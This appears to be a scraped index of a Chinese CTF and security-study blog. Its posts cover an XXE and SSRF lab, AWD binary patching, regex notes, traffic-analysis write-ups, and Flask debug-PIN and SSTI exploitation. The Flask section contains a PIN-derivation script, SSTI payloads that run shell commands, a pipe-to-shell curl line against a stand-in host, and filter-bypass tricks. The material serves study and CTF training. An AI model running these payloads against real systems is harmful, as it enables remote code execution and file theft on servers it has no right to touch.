&quot;file:///c:/windows/win.ini&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;\n\n\n那么我们如果修改一下源码呢\n\n先删掉LIBXML_NOENT试一试\n我们可以发现Charmersix仍然可以回显,但是没法回显win.ini内容了\n\nURL重定向\n不安全的url跳转\n不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话就可能发生”跳错对象”的问题。\nurl跳转比较直接的危害是:–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站\n这个漏洞比较简单,come on,来测一把!\n\n\n成功跳转到myblog\nSSRF\nSSRF(Server-Side Request Forgery:服务器端请求伪造)\n其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制\n导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据\n数据流:攻击者—–&gt;服务器—-&gt;目标地址\n根据后台使用的函数的不同,对应的影响和利用方法又有不一样\nPHP中下面函数的使用不当会导致SSRF:file_get_contents()fsockopen()curl_exec()\n\n\n如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,则请做好目标地址的过滤。\n你可以根据”SSRF”里面的项目来搞懂问题的原因\n\nSSRF(curl)首先我们可以效仿上一题,通过http协议,url重定向到其他页面\n我们也可以效仿上上个漏洞,通过file协议读取一些我们想要的文件\n\n或者是像这样\nSSRF(file_get_contents)仍然可以\n全剧终","tags":["Web","study","pikachu"]},{"title":"Pwn_patch","url":"/2023/06/21/pwn_patch/","content":"此篇参考合天网安实验室的这篇文章\nIDA安装keypatch插件下载地址:https://github.com/keystone-engine/keypatch\npip install keystone-enginepip install six\n\n\n将keypatch.py文件复制到 IDA的plugins文件夹下，重启IDA\n\n安装成功\n跳转指令无符号跳转\n\n\n汇编指令\n描述\n\n\n\nJA\n无符号大于则跳转\n\n\nJNA\n无符号不大于则跳转\n\n\nJAE\n无符号大于等于则跳转（同JNB）\n\n\nJNAE\n无符号不大于等于则跳转（同JB）\n\n\nJB\n无符号小于则跳转\n\n\nJNB\n无符号不小于则跳转\n\n\nJBE\n无符号小于等于则跳转（同JNA）\n\n\nJBNE\n无符号不小于等于则跳转（同JA）\n\n\n有符号跳转\n\n\n汇编指令\n描述\n\n\n\nJG\n有符号大于则跳转\n\n\nJNG\n有符号不大于则跳转\n\n\nJGE\n有符号大于等于则跳转（同JNL）\n\n\nJNGE\n有符号不大于等于则跳转（同JL）\n\n\nJL\n有符号小于则跳转\n\n\nJNL\n有符号不小于则跳转\n\n\nJLE\n有符号小于等于则跳转（同JNG）\n\n\nJNLE\n有符号不小于等于则跳转（同JG）\n\n\nPatch-整数 溢出\nscanf以long int长整形读取输入到unsigned int变量v2中, 然后将v2强制转化为int再与int 48比较\n但从scanf读入一个负数时, 最高位为1, 从unsigned int强制转换为int结果是负数, 必定比48小, 在后面read读入会造成栈溢出\n方法将第九行的if跳转汇编指令patch为无符号的跳转指令, 具体参考跳转指令表\n使用keypatch进行修改\njle--&gt;jbe\n\npatch-栈溢出\n对于栈溢出加固，x64 更容易一些，因为是使用寄存器传参，而x86 使用栈传参，需要用 nop 等保持加固前后的空间不变\n\nx64\n方法100是第三个参数, 存储寄存器是rdx, 找到给rdx传参的汇编指令进行patch\n使用ida默认修改插件修改(Edit-Patch Program-Change word), 也可以使用keypatch\n\n0x64 是长度\n0xBA 是操作符\n\n\n0x64-&gt;0x20\n\n\nx86不需要对齐\n找到压栈的指令, 修改压入的数值\n\n\n\n修改数值需要补上 0x\n这里修改前 size 为 2 ，修改后 size 也为 2 ，所以这题 patch 不需要用 nop 保持 size\n\n需要对齐\n找到压栈的指令, 修改压入的数值\n\n\n直接修改0x20后, size 长度不对齐, 会引起栈空间变化, 需要用nop进行对齐\n\n\n更方便快捷的方法是勾选NOPs padding until next instruction boundary进行自动填充\npatch-格式化字符串\n修改函数将printf改为puts, 将call的地址改为puts plt地址:\n\n\n这个方法局限性在于: puts会在原字符串多加\\n, 主办方check可能因此而不通过\n修改printf参数\n将printf(format)修改为`printf(“%s”,format)\n修改printf前面的传参指令:\n\nmov edi, offset 0x400c01; mov esi,offset format;\n\n\npatch-UAF\n修改逻辑是劫持call指令跳转到.eh_frame段上写入的自定义汇编程序\n先在.eh_frame段上写入代码, 首先是call free完成释放, 然后对chunk_list进行置零. 取chunk_list地址的汇编可以从call free前面抄过来\ncall 0x900;           #调用free函数（plt地址）  mov     eax, [rbp-0xc]; #取出下标值cdqe;lea     rdx, ds:0[rax*8];lea rax, qword ptr [heap];  mov r8,0; #段地址不能直接赋予立即数mov [rdx+rax],r8;jmp 0xD56; #跳回原来的地址\n\n\npatch-if范围假设需要将图上第二个if放到if结构内, 修改跳转的地址即可:\n\n原始跳转代码:\n\njs 0x40081C --&gt; js 0x400845\n\n\npatch-更换危险函数\n类似与 uaf 一样写汇编实现功能调用，将危险函数替换为其他函数，如果程序中没有目标函数，就通过系统调用方式调用。\n将 gets 替换为 read 输入\n\n.eh_frame写入汇编，将 rdi 的写入地址移动到 rsi ，把其他寄存器也传参之后进行系统调用：\n\n\n\npwn通防小工具注意: 这里由于编译方式不同的原因, 作者写的工具目前仅适配Ubuntu16;18;20\n基于pwntools和seccomp-tools的awd pwn通防小工具, 原创在这\nGitHub地址: https://github.com/TTY-flag/evilPatcher\n环境需要 运行需要依赖seccomps-tools和pwntools\npwntools安装\n这里要在python2下安装,因为工具是基于python2的\nsudo apt install python2sudo apt install python2curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.pysudo python2 get-pip.pysudo python2 -m pip install pwntools\n\nseccomps-tools安装\nsudo gem install seccomp-tools#如果在编译时失败，请尝试：sudo apt install gcc ruby-dev\n\ntest结束后我们可以随便找一个pwn题试一下\npython2 exp1.pycat flag.txt\n\n\n然后\npython2 evilPatcher.py pwn1 sandboxs/mini_sandbox.asm 1\n\n试一下通防脚本\n\n生成后的pwn1.patch修改为pwn1, 再运行一下exp\npython2 exp1.pycat flag.txt\n\n成功!\n\n","tags":["Study","Pwn","patch","awd"]},{"title":"python re模块","url":"/2022/05/03/python%20re/","content":"初识re\nfindallfindall : 匹配字符串中所有的符合正则内容\nimport relist = re.findall(r&quot;\\d+&quot;,&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;)print(list)\n\nfinditerfinditer : 匹配字符串中所有内容（返回的是迭代器）;从迭代器里拿到内容需要.group()\nimport reit = re.finditer(r&quot;\\d+&quot;,&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;)for i in it :    print(i.group())\n\nsearchsearch : 找到一个结果就返回，返回结果是match对象，需要.group()\nimport res = re.search(r&quot;\\d+&quot;,&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;)print(s.group())\n\nmatchmatch : 从头开始匹配\nimport rem = re.match(r&quot;\\d+&quot;,&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;)print(m.group())\n\n预加载正则表达先正则匹配，再re\nimport reobj = re.compile(r&quot;\\d+&quot;)ret =  obj.finditer(&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;)for it in ret :     print(it.group())\n\n一个鲜明的预加载例子import rea = &quot;&quot;&quot;&lt;div class= &#x27;jay&#x27;&gt;&lt;span id= &#x27;1&#x27;&gt;郭麒麟&lt;/span&gt;&lt;/div&gt;&lt;div class= &#x27;jj&#x27;&gt;&lt;span id= &#x27;2&#x27;&gt;郭德纲&lt;/span&gt;&lt;/div&gt;&lt;div class= &#x27;mike&#x27;&gt;&lt;span id= &#x27;3&#x27;&gt;于谦&lt;/span&gt;&lt;/div&gt;&lt;div class= &#x27;jack&#x27;&gt;&lt;span id= &#x27;4&#x27;&gt;岳云鹏&lt;/span&gt;&lt;/div&gt;&quot;&quot;&quot;#  (?P&lt;分组名字&gt;正则) 可以单独从正则匹配内容中提取所需obj = re.compile(r&quot;&lt;div class= &#x27;(?P&lt;english&gt;.*?)&#x27;&gt;&lt;span id= &#x27;(?P&lt;id&gt;\\d+)&#x27;&gt;(?P&lt;德云社&gt;.*?)&lt;/span&gt;&lt;/div&gt;&quot;, re.S)#让. 能匹配到换行符result = obj.finditer(a)for it in result :    print(it.group(&quot;english&quot;))    print(it.group(&quot;id&quot;))    print(it.group(&quot;德云社&quot;))\n\n","tags":["python"]},{"title":"(陇剑杯 2021)日志分析系列","url":"/2022/05/24/rizhifenxi/","content":"这一系列一共有两部分，一部分是日志分析的三个题目，另一部分是简单的日志分析\n日志分析（1）这题让找源码文件，根据经验，源码一般放在www/wwwroot下边\n直接CTRL+F找一下，果然有。\n\n（2）一眼顶针\n\n解码看看\n\n这不很明显sess_car\n（3）从（2）能看出一段反序列化，那么类自然就是SplFileObject\n简单日志分析（1）打开浏览一下\n\n发现这么个东西，像极了base64\n解码看，懂的都懂\n\n参数就是user了\n（2）又见base64\n\n（3）还是base64，好没劲啊\n\n","tags":["wp","flow","Misc"]},{"title":"SkyMirror_WP_USB流量分析","url":"/2022/04/30/usb%20wireshark/","content":"(RoarCTF2019)davinci_cipher_数位板流量分析这是我目前做的比较难的一个流量分析，这题干扰项超级多，但是根据提示能知道是个usb流量分析，如果没有这个提示，做这个题绝对是超级艰难；题目在这儿\n首先flag.txt：通过百度，可以得出是一串emoji的Unicode的编码，可以来这里解码一下\n然后经过初步的流量分析（或者说是看提示），可以看出有一串非常可疑的USB流量tshark分离一下\n\ntshark -r k3y.pcapng -T fields -e usbhid.data &gt; usbdata.txt\n\n看别的大佬的博客，学到了一种处理空白数据的方法\n\ntshark -r ‘k3y.pcapng’ -T fields -e usbhid.data |sed ‘/^$/d’ &gt; usbdata.txt\n\n再看流量，看到了wacom是一块数位板\n\nwacom是有压感的绘图板，详细说明在USB协议文档里的Figure 19：\n\n一般都是x坐标2个字节，Y坐标也是2个字节，又因为X，Y坐标均以小端方式存储，因此画图坐标个位数字变化会大一些。猜测坐标如图所示（深紫X，浅蓝Y，红色压感）。\n\n开始处理一下有用数据\na = open(&quot;coor.txt&quot;,&#x27;a+&#x27;)for line in open(&quot;usbdata.txt&quot;,&#x27;r&#x27;):    if(len(line)==55):        a.write(line)#把没必要的数据过滤掉，依据长度a.close()\n\n剃掉压感为0的数据，把坐标提取出来还原成10进制。\na = open(&quot;finish.txt&quot;,&#x27;a+&#x27;)x1 = []y1 = []x2 = []y2 = []for line in open(&quot;coor.txt&quot;,&#x27;r&#x27;):    if(line[16:18]!=&quot;00&quot;):        x1.append(line[4:8])        y1.append(line[10:14])#筛选必要的坐标数据for i in x1:    x2.append(int(i[2:4]+i[0:2],16))for j in y1:    y2.append(int(j[2:4]+j[0:2],16))#把十六进制坐标转为十进制for z in range(len(x2)):#根据 一般都是x坐标2个字节，Y坐标也是2个字节 再判断一下    a.write(str(x2[z])+&quot; &quot;+str(y2[z])+&#x27;\\n&#x27;)\n\n然后放到gnuplot\n\nplot “finish.txt”\n\n\n反转一下得到\n\nMONA_LISA_IS_A_MAN\n\n用第一步flag.txt里的emoji作为密文，上步得出的字符串作为密钥，emoji解密，得到flag。\n","tags":["python","wp","SkyMirror","USB_flow"]},{"title":"（2022第二届网刃杯） ISC","url":"/2022/04/29/wangren2022ics/","content":"ncsubj这题主要考点是编码方面，打开，追踪流一下，发现奇奇怪怪编码\n\n\n三段，长得很像base64，解码看看\n\n果然，没有想象的那么简单，继续解码\n\nwhatancsubject很像，还真是\n喜欢移动的黑客比赛时候，正常开，打不开，分了一下，出来了个压缩包，就以为是压缩包，然后思路走偏了。\n之前从来没有接触过流量的文件头，也没看出来，这次涨姿势了。\n把题目中的pcapang和正常的pcapang放一起，会很明显发现文件头不一样，头四位前面改成 0A0D0D0A ，就能正常打开\n继续看，结合提议，筛选出modbus，流量中的数据一般是HEX，所以算一下10000的HEX = 2710\n继续翻找，发现异常\n\n转回10进制，10086，拼接68156\n得到flag\nxyp07这题推荐一款工具科来网络分析系统官网是能下到的\n也不知道是不是巧合，我也是第一次用这款工具，\n咱们直接打开，把流量包一扔，它就诊断出来了\n\n打开一翻，出现奇怪东西\n\n解码，base91\n\n\ncryptolalia题目在这儿\n题目附件为一张图片，直接修改后缀，能得到一个压缩包，压缩包注释一条鱼，并且放出hint：鱼很重要\n暂时不知道有什么用，继续看\n又有hint，能爆破，果然爆破出污泥脱水间数据详情的密码\n\n\n打开流量，懵逼了，猜测被加密过，追踪TCP流发现\n\n发现似乎密文U2FsdGVkX19pczQKWsMcjgrJt8f09dSN\n来到这里，联想fish\n解码得到\n得到设备药剂间数据详情压缩包密码，解压后又一压缩包和txt，txt最后说年轻人，有时候眼见不一定为实！\n什么意思，莫非是伪加密，好家伙，一修复就好了\n解压又得到一流量\n无脑追踪流，0流就发现异常\n\n把图片导出来，修改高度就能得到\n\nLED_BOOM这题不难，认真读题很重要，搞安全一定要对一切信息很敏感\n这题当时没有认真读题，所以没有做出来\n先看题，题目在这儿\n\n雪殇直接一眼顶针AES，我是一眼看不出来，得猜\n\n题干在这里，强调三次筛选一下s7comm，按照长度，会发现有三个length相同的包，细看发现了LED:On ，Off\n\n得到585692787\n结合图片中的密文，U2FsdGVkX19cOOV8qLVgcso8U4fse+7LirQKiHFkn9HU9BuwFAivH1siJXg/Rk6z解秘一下\n在这里解码得到\n\n","tags":["wp","flow","SkyMirror","ISC"]},{"title":"web10_pyweb+flaskssti+反序列化","url":"/2023/04/23/web10-pyweb-flaskssti-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"Flask学习提到python就离不开flask, 这里我们先借用flask写一个helloworld\n首先直接pip install flask\nfrom flask import Flaskapp = Flask(__name__)@app.route(&quot;/&quot;) #表示首页目录def hello():    return &quot;helloworld&quot;if __name__ == &quot;__main__&quot;:    app.run()\n\n\n这里是5000端口, 修改端口也是很简单, 直接在run()里加port=即可\n\n这里再介绍两个参数host和debug\nfrom flask import Flaskfrom flask import requestapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    return &quot;helloworld&quot;@app.route(&quot;/hello&quot;,methods=[&#x27;POST&#x27;])def hello():    username = request.form[&#x27;username&#x27;]    passwd = request.form[&#x27;passwd&#x27;]    result = check(username,passwd)    if result:        return &#x27;welcome login&#x27;    else:        return &#x27;error&#x27;def check(username,passwd):    return username==&#x27;admin&#x27; and passwd==123456if __name__ == &quot;__main__&quot;:    app.run(host=&quot;0.0.0.0&quot;,port=80,debug=True)\n\n添加host=&quot;0.0.0.0&quot;, 我们的网站就可以让其他IP通过http://10.187.81.36/地址访问\n\n然后, 如果我们这里故意写错一下, 就会出现debug内容\nFlask PIN码计算debug开启了就会存在一个漏洞, 这里我们可以注意到, 开启debug后, 会返回一个PIN码\n这里我们访问一下http://10.187.81.36/console就会弹出一个让我们填pin码的框, 只要正确输入pin码, 我们就可以实现远程任意命令执行, 比如这里我们把事先知道的pin码输入进去\n就到了一个python环境, 我们就可以通过os执行系统命令\nimport osos.system(&#x27;calc&#x27;)\n\n\n然而这个pin码又是可以通过计算得出的\n这里我们看一下python源码, 找一下pin码是如何计算得出的, 源码路径Python\\Lib\\site-packages\\werkzeug\\debug\\__init__.py\n\n在这里我们可以找到pin的计算逻辑\n这里的这个uuid.getnode()可以通过本地执行得到\n\n这里我们多次执行可以发现, 值是不变的, 说明是与我们机器有关的固定值\n然后我们看一下machine_id的计算逻辑\n#摘自Python\\Lib\\site-packages\\werkzeug\\debug\\__init__.pydef get_machine_id() -&gt; t.Optional[t.Union[str, bytes]]:    global _machine_id    if _machine_id is not None:        return _machine_id    def _generate() -&gt; t.Optional[t.Union[str, bytes]]:        linux = b&quot;&quot;        # machine-id is stable across boots, boot_id is not.        for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;:            try:                with open(filename, &quot;rb&quot;) as f:                    value = f.readline().strip()            except OSError:                continue            if value:                linux += value                break        # Containers share the same machine id, add some cgroup        # information. This is used outside containers too but should be        # relatively stable across boots.        try:            with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f:                linux += f.readline().strip().rpartition(b&quot;/&quot;)[2]        except OSError:            pass        if linux:            return linux        # On OS X, use ioreg to get the computer&#x27;s serial number.        try:            # subprocess may not be available, e.g. Google App Engine            # https://github.com/pallets/werkzeug/issues/925            from subprocess import Popen, PIPE            dump = Popen(                [&quot;ioreg&quot;, &quot;-c&quot;, &quot;IOPlatformExpertDevice&quot;, &quot;-d&quot;, &quot;2&quot;], stdout=PIPE            ).communicate()[0]            match = re.search(b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;, dump)            if match is not None:                return match.group(1)        except (OSError, ImportError):            pass        # On Windows, use winreg to get the machine guid.        if sys.platform == &quot;win32&quot;:            import winreg            try:                with winreg.OpenKey(                    winreg.HKEY_LOCAL_MACHINE,                    &quot;SOFTWARE\\\\Microsoft\\\\Cryptography&quot;,                    0,                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,                ) as rk:                    guid: t.Union[str, bytes]                    guid_type: int                    guid, guid_type = winreg.QueryValueEx(rk, &quot;MachineGuid&quot;)                    if guid_type == winreg.REG_SZ:                        return guid.encode(&quot;utf-8&quot;)                    return guid            except OSError:                pass        return None    _machine_id = _generate()    return _machine_id\n\n这里给出了Linux,MacOs和Windows三个系统的获取方法, 我们这里先来看一下Windows系统的\n我们win+r输入regedit然后在路径里打开计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography就能看到machine_id就是图中我打码的部分\n然后我们根据pin码计算逻辑, 自己计算一下本机的pin码\nimport hashlibfrom itertools import chainusername = &quot;Charmersix&quot;modname=&quot;flask.app&quot;appname=&quot;Flask&quot;moddir=&quot;E:\\\\Python\\\\lib\\\\site-packages\\\\flask\\\\app.py&quot;num=Nonerv=Noneprobably_public_bits = [        username,        modname,        appname,        moddir,    ]private_bits = [&quot;35315514738897&quot;, &quot;a*******-****-****-****-c**********6&quot;]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode(&quot;utf-8&quot;)    h.update(bit)h.update(b&quot;cookiesalt&quot;)if num is None:    h.update(b&quot;pinsalt&quot;)    num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]if rv is None:        for group_size in 5, 4, 3:            if len(num) % group_size == 0:                rv = &quot;-&quot;.join(                    num[x : x + group_size].rjust(group_size, &quot;0&quot;)                    for x in range(0, len(num), group_size)                )                break        else:            rv = numprint(rv)\n\n可以发现结果与之前一样\nLinux下当然也是可以计算得出的, 具体区别就是Linux下需要拿的文件不一样\ndef _generate() -&gt; t.Optional[t.Union[str, bytes]]:       linux = b&quot;&quot;       # machine-id is stable across boots, boot_id is not.       for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;:           try:               with open(filename, &quot;rb&quot;) as f:                   value = f.readline().strip()           except OSError:               continue           if value:               linux += value               break       # Containers share the same machine id, add some cgroup       # information. This is used outside containers too but should be       # relatively stable across boots.       try:           with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f:               linux += f.readline().strip().rpartition(b&quot;/&quot;)[2]       except OSError:           pass       if linux:           return linux\n\nLinux下就需要读/etc/machine-id和/proc/sys/kernel/random/boot_id和/proc/self/cgroup三个文件\n这里感谢ctfshow的大师傅提供了一个一把梭的脚本\n#导入需要的包import hashlibfrom itertools import chainimport requestsurl = &quot;http://9ab6f69b-79a0-471c-bf92-9e4fb9df9a98.challenges.ctfer.com:8080/file?filename=&quot;#题目地址username = &quot;root&quot;path=&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;#路径:报错可得def get_uuid():    payload = &quot;/sys/class/net/eth0/address&quot;    response = requests.get(url=url+payload)    if response.status_code ==200:        print(&quot;uuid is &#123;&#125; &quot;.format(int(response.text.strip().replace(&quot;:&quot;,&quot;&quot;)[1:],16)))        return str(int(response.text.strip().replace(&quot;:&quot;,&quot;&quot;)[1:],16))    else:        return &quot;&quot;def get_mechine_id():    payload = &quot;/etc/machine-id&quot;    response = requests.get(url=url+payload)    if response.status_code ==200:        print(&quot;machine-id is &#123;&#125; &quot;.format(pin))        return response.text.strip()    else:        return &quot;&quot;def get_boot_id():    payload = &quot;/proc/sys/kernel/random/boot_id&quot;    response = requests.get(url=url+payload)    if response.status_code ==200:        print(&quot;boot_id is &#123;&#125; &quot;.format(response.text.strip()))        return response.text.strip()    else:        return &quot;&quot;def get_cgroup():    payload = &quot;/proc/self/cgroup&quot;    response = requests.get(url=url+payload)    if response.status_code ==200:        print(&quot;cgroup is &#123;&#125; &quot;.format(str(response.text.strip().rpartition(&quot;/&quot;)[2])))        return response.text.strip().rpartition(&quot;/&quot;)[2]    else:        return &quot;&quot;def get_PIN():    rv = None    num = None    probably_public_bits = [        username,# /etc/passwd        &#x27;flask.app&#x27;,# 默认值        &#x27;Flask&#x27;,# 默认值        path # 报错得到    ]            private_bits = [get_uuid(), get_mechine_id()+get_boot_id()+get_cgroup()]    print(&quot;private_bits is &quot;)    print(private_bits)      #复制算法逻辑      h = hashlib.sha1()    for bit in chain(probably_public_bits, private_bits):        if not bit:            continue        if isinstance(bit, str):            bit = bit.encode(&quot;utf-8&quot;)        h.update(bit)    h.update(b&quot;cookiesalt&quot;)    cookie_name = f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;    # If we need to generate a pin we salt it a bit more so that we don&#x27;t    # end up with the same value and generate out 9 digits    if num is None:        h.update(b&quot;pinsalt&quot;)        num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]    # Format the pincode in groups of digits for easier remembering if    # we don&#x27;t have a result yet.    if rv is None:        for group_size in 5, 4, 3:            if len(num) % group_size == 0:                rv = &quot;-&quot;.join(                    num[x : x + group_size].rjust(group_size, &quot;0&quot;)                    for x in range(0, len(num), group_size)                )                break        else:            rv = num    return rvif __name__ == &#x27;__main__&#x27;:        pin = get_PIN()        print(&quot;PIN is &#123;&#125; &quot;.format(pin))\n\n基于Flask下的SSTIssti全称为模板注入, 也就是当我们可以控制要渲染的模板的时候, 也就是可以控制模板中的变量标记内容, 这时候, 我们可以利用模板语法, 执行python代码, 实现任意代码执行\npython魔术方法和内置类在学习ssti注入之前, 我们首先需要了解一些python的魔术方法和内置类\nclass__class__用于返回该对象所属的类\n🌰\nbase__base__用于获取类的基类(也称父类)\n🌰\nmro__mro__返回解析方法调用的顺序, (当调用__mro__[1]或者-1时作用其实等同于__base__)示例:\n🌰\n\nsubclasses()__subclasses__()可以获取类的所有子类\n🌰\n目前主要分两种情况下的模板注入\n模板名称可控类似于上面学到的内容, 当login.html这个参数可以控制的时候, 我们就能渲染我们指定的文件\nfrom flask import Flaskfrom flask import requestfrom flask import  render_templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    return &#x27;plz login&#x27;@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])def login():    return render_template(&quot;login.html&quot;, username=request.form[&#x27;username&#x27;],passwd=request.form[&#x27;passwd&#x27;])if __name__ == &#x27;__main__&#x27;:    app.run(host=&quot;0.0.0.0&quot;,port=80,debug=True)\n\n\n\n\nrender_template 是flask中页面跳转的方法，其用法很简单，如下：\nreturn render_template(&quot;index.html&quot;)\n\n这种方法可以传递参数，具体方法如下：\nreturn render_template(&quot;index.html&quot;, msg=session.get(&quot;username&quot;))\n\n这时可以将你想要传递的数据传递到你要跳转的页面，在页面中显示这些内容需要使用：\n&#123;&#123;msg&#125;&#125;\n\n这里的login.html可控, 这时候需要一个上传点, 上传包含模板语法的html被渲染就可以渲染执行我们的python代码\n模板内容可控如果要实现模板内容可控就需要使用到危险函数, 例如这里使用一个render_template_string()\nfrom flask import Flask, render_template_stringfrom flask import requestapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    return &#x27;plz login&#x27;@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])def login():    return render_template_string(request.form[&#x27;content&#x27;])if __name__ == &#x27;__main__&#x27;:    app.run(host=&quot;0.0.0.0&quot;,port=80,debug=True)\n\n这里可以成功执行标签内的表达式\n\n这里介绍一个最简单的payloadname=&#123;&#123;\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('curl https://your-shell.com/ip:port |sh')&#125;&#125;\n这里可以通过反弹shell拿到flag\n做题思路这里大致写一下做题步骤\n在python中, 是通过类名方法名的方式调用的, 如果我们要调用shell命令, 一般我们可以使用os.system(&#39;calc&#39;), 那么如何在表达式标签中, 找到os类呢\n第一步 拿到当前类\n也就是通过类型拿到__class__\n这里我们使用&#123;&#123;\"\".__class__&#125;&#125;\n第二步 拿到当前类的基类\n这时候, 我们可以写为\n\n&#123;&#123;\"\".__class__.__base__&#125;&#125;\n&#123;&#123;\"\".__class__.__base[0]__&#125;&#125;\n&#123;&#123;\"\".__class__.__mro__[1]&#125;&#125;\n\n第三步 拿到基类的所有子类\n&#123;&#123;\"\".__class__.__base__.__subclasses__()&#125;&#125;\n第四步 寻找我们要利用的os类\n这里我们需要找到os类的下标, 我们可以采用数,的方式, 可以使用文本编辑软件ctrl+f\n第五步 找到可利用的类的下标后, 就能知道其方法\n使用__init__方法对类进行初始化\n&#123;&#123;&quot;&quot;.__class__.__base__[0].__subclasses__()[132].__init__&#125;&#125;\n\n然后再调用__globals__获取到方法内以字典的形式返回的方法/属性等\n&#123;&#123;&quot;&quot;.__class__.__base__[0].__subclasses__()[132].__init__.__globals__&#125;&#125;\n\n然后就可以通过数组key拿到对应的方法了, 这里我们使用shell执行方法popen\n&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;\n\n\n前面所说的相当于命令执行, 下面介绍一种代码执行方法\n使用uiltins类的eval方法构造\n&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;\n\nflask的ssti的过滤与绕过绕过.过滤\n使用[]绕过 \n&#123;&#123;&quot;&quot;.__class__&#125;&#125;=&#123;&#123;&quot;&quot;[&#x27;__class__&#x27;]&#125;&#125;\nattr过滤器绕过\n&#123;&#123;&quot;&quot;.__class__&#125;&#125;=&#123;&#123;&quot;&quot;|attr(&#x27;__class__&#x27;)&#125;&#125;\n\n绕过_过滤\n构造_出来\n&#123;% set a=(()|select|string|list).pop(24)%&#125;&#123;%print(a)%&#125;\n16进制编码绕过\n&#123;&#123;()[&quot;\\x5f\\x5fcalss\\x5f\\x5f&quot;]&#125;&#125; = &#123;&#123;().__class__&#125;&#125;\n\n绕过[]过滤可以使用__getitem__魔术方法, 它的作用简单说就是把中括号转化为括号的形式\n__base__[0]=__base__.getitem__(0)\n\n绕过\\&#123;\\&#123;过滤可以利用jinja2的语法, 用\\&#123;%来进行rce\n&#123;%&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;\n\n还可以利用for循环\n&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%)&#125;&#123;%for i.__name__ == &#x27;_wrp_close&#x27;%&#125;&#123;%print i.__init__.globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;\n\n绕过单/双引号过滤可以采用request.args.a然后给a赋值的方式进行绕过\n&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;\n\n\nargs被ban了可以用request.cookie伪造\n绕过数字过滤如果数字0-9被ban了, 可以通过count来得到数字\n&#123;&#123;(dict(e=a)|join|count&#125;&#125;+&#123;&#123;(dict(e=a)|join|count&#125;&#125;\n\n这样就能通过1+1来构造出2\n可以用全角字符绕过例如可以通过这个网站拿到全角数字\n１２３４５６７８９０\n\n绕过关键字class、base这种关键词被过滤的情况, 通常使用join拼接实现\n比如:\n&#123;&#123;dict(__in=a,it__=a)|join&#125;&#125;= __init__\n\nSSTI_payload1、任意命令执行&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==&#x27;_wrap_close&#x27;%&#125;&#123;%print i.__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;2、任意命令执行&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;//这个138对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload3、任意命令执行&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;4、任意命令执行&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;//x的含义是可以为任意字母，不仅仅限于x5、任意命令执行&#123;&#123;config.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;6、文件读取&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;, 